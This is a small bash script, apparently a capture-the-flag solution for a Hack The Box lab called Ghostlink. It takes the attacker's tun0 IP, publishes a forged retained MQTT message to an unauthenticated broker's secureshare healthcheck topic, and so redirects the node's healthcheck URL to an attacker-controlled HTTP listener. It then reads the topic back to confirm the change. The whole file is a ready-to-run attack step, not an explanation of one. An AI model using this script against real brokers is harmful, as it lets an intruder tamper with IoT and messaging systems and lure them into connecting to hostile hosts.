#!/bin/bash
# Point Ghostlink MQTT secureshare healthcheck at this host (retained).
# Usage: ./mqtt_set_healthcheck.sh <TUN0_IP> [http_port]
set -euo pipefail
HOST="${1:?tun0 IP}"
PORT="${2:-8888}"
TOPIC='GhostProtocolZero/systems/node/secureshare/healthcheck'
BROKER="${BROKER:-ghostlink.htb}"
PAYLOAD=$(printf '{"timestamp":"lab","node":"node-6","telemetry":{"healthy":true,"url":"http://%s:%s","lastCheckSecAgo":31,"responseCode":"200","ip":"172.16.20.10"}}' "$HOST" "$PORT")
mosquitto_pub -h "$BROKER" -p 1883 -r -t "$TOPIC" -m "$PAYLOAD"
echo "[+] retained $TOPIC -> http://$HOST:$PORT"
mosquitto_sub -h "$BROKER" -p 1883 -t "$TOPIC" -C 1 -v
